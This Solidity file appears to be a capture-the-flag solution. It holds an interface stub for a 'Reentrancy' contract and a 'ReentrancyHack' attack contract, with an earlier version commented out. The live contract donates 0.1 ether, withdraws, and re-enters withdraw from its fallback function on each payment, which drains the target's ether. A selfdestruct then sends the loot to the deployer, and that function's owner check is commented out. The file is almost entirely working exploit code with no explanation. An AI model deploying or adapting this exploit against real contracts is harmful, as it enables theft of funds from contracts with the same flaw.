pragma solidity ^0.4.18;

contract Reentrancy {

  function donate(address _to) public payable { }
  
  function balanceOf(address _who) public view returns (uint balance){}

  function withdraw(uint _amount) public { }

  function() public payable {}
}
/*
contract ReentrancyHack {
    address target;
    address owner;
   
    Reentrancy c;
   
    constructor(address _target) {
        target = _target;
        owner = msg.sender;
        c = Reentrancy(target);
       
    }
    
    function attack() public payable {
        c.donate.value(0.1 ether)(this);
        c.withdraw(0.1 ether);
    }
   
    function() payable {
        c.withdraw(0.1 ether);
    }
    
    function ethBalance(address _c) public view returns(uint) {
      return _c.balance;
    }
    
    function kill () {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
   
}*/


contract ReentrancyHack{
    
    //mapping(address=> uint) public stolen_balance;
    Reentrancy public target;
    address public owner;
    
    function ReentrancyHack (address _inst) public {
        target = Reentrancy(_inst);
        owner = msg.sender;
        //stolen_balance[msg.sender] = 0;
    }
    
    function attack() public payable {
        target.donate.value(0.1 ether)(this);
        target.withdraw(0.1 ether);
    }
    
    function () public payable {
       // stolen_balance[msg.sender] += msg.value;
        target.withdraw(0.1 ether);
    }
    
    function checkBalance() public view returns (uint){
        return this.balance;
    }
    
    function kill () public {
        // require(msg.sender == owner);
        selfdestruct(owner);
    }
    
}